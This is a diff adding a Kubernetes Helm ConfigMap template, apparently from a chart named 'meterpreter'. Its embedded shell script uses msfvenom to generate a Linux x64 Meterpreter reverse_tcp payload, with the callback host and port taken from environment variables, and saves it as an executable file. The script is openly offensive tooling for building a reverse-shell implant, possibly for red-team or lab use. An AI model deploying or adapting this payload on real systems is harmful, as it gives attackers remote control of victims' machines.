@@ -1,0 +1,15 @@
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: {{ include "meterpreter.fullname" . }}
+  labels:
+    {{- include "meterpreter.labels" . | nindent 4 }}
+data:
+  meterpreter.sh: |-
+    #!/bin/bash -x
+
+    env
+    pwd
+    ./msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > /meterpreter/meterpreter
+    chmod +x /meterpreter/meterpreter
+    ls -la /meterpreter/meterpreter
